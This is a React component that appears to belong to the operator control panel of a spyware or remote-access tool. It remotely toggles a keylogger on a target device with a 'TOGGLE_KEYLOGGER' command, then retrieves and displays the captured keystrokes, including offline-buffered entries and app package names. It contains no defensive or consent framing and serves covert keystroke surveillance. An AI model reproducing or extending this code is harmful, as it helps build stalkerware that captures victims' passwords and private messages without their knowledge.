import { useState, useEffect } from 'react';
import { api } from '../../lib/api';
import { Card, C, parseCcsData } from './shared';

export default function KeylogTab({ device }) {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(false);
  const [active, setActive] = useState(false);

  async function load() {
    setLoading(true);
    try { setEntries(await api.getData(device.id, 'keylog', 1000)); }
    catch { setEntries([]); }
    finally { setLoading(false); }
  }

  async function toggle() {
    const next = !active;
    setActive(next);
    await api.sendCommand(device.id, 'TOGGLE_KEYLOGGER', { enabled: next }).catch(() => {});
  }

  useEffect(() => { load(); }, [device.id]);

  // CCS sends KEYLOG as direct JSON: {type:'KEYLOG', data:'...text...', pkg:'com.x.y', ...}
  // or KEYLOG_OFFLINE queue
  const typed = entries.map(e => {
    const d = e.data;
    if (typeof d?.data === 'string') return d.data;
    if (typeof d?.text === 'string') return d.text;
    return '';
  }).join('');

  return (
    <Card title="Keylogger"
      action={
        <div style={{ display: 'flex', gap: 6 }}>
          <button onClick={toggle}
            style={{ padding: '5px 12px', background: active ? '#00613a22' : 'none',
              border: `1px solid ${active ? C.green : C.border}`, borderRadius: 5,
              color: active ? C.green : C.muted, fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
            {active ? '⏹ Stop' : '▶ Start'}
          </button>
          <button onClick={load}
            style={{ padding: '5px 10px', background: 'none', border: `1px solid ${C.border}`,
              borderRadius: 5, color: C.muted, fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>↻</button>
        </div>
      }>
      {loading && <div style={{ color: '#444', fontSize: 12 }}>loading…</div>}
      <div style={{ fontFamily: 'monospace', fontSize: 12, color: '#bbb',
        background: '#050508', padding: 12, borderRadius: 5, border: `1px solid ${C.border}`,
        minHeight: 100, maxHeight: 400, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
        {typed || <span style={{ color: '#333' }}>No keylog data yet</span>}
      </div>
      <div style={{ fontSize: 11, color: C.dim, marginTop: 8 }}>
        {entries.length} entries · KEYLOG + KEYLOG_OFFLINE queued events · includes offline buffer
      </div>
    </Card>
  );
}
